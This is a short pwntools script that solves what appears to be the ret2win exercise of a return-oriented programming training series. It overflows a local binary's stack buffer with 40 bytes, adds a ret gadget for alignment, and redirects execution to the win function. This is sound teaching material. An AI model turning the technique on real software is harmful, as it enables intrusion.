from pwn import *

exe = ELF("./ret2win", checksec=False)
p = process('./ret2win')

rop = ROP(exe)
ret = rop.find_gadget(["ret"])[0]

payload  = b'A' * 40
payload += p64(ret)                  # fix stack alignment
payload += p64(exe.symbols['ret2win'])

p.sendlineafter('> ', payload)

output = p.recvall().decode(errors="ignore")
print(output)